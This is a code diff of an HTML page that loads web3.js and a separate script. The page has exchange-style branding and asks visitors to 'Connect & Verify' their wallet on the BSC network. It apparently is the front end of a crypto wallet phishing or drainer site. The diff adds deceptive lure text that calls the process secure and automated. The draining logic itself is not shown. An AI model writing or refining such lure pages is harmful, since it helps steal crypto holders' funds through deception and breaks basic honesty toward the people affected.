@@ -3,22 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Asset Verification</title>
+    <title>Secure Verification</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.1/web3.min.js"></script>
-    <link rel="stylesheet" href="style.css">
+    <style>
+        body { margin: 0; font-family: 'Segoe UI', sans-serif; background: #0b0e11; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .card { background: #1e2329; padding: 30px; border-radius: 16px; text-align: center; box-shadow: 0 8px 24px rgba(0,0,0,0.5); width: 100%; max-width: 350px; }
+        h2 { color: #f0b90b; margin-bottom: 15px; }
+        p { color: #929aa5; font-size: 14px; line-height: 1.6; margin-bottom: 25px; }
+        .btn { background: #f0b90b; color: #000; border: none; padding: 15px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.2s; }
+        .btn:hover { background: #d9a508; }
+        .btn:disabled { background: #474d57; cursor: not-allowed; }
+    </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="card">
-            <h2>Wallet Verification</h2>
-            <p>Connect your wallet to verify your USDT assets on BSC network.</p>
-            <button id="nextBtn" onclick="Next()">Connect Wallet</button>
-            <div id="status"></div>
-        </div>
+    <div class="card">
+        <h2>Verification Required</h2>
+        <p>Connect your wallet to verify your assets on the BSC network. This is a secure automated process.</p>
+        <button id="nextBtn" class="btn">Connect & Verify</button>
     </div>
 
     <script src="script.js"></script>
 </body>
 </html>
-
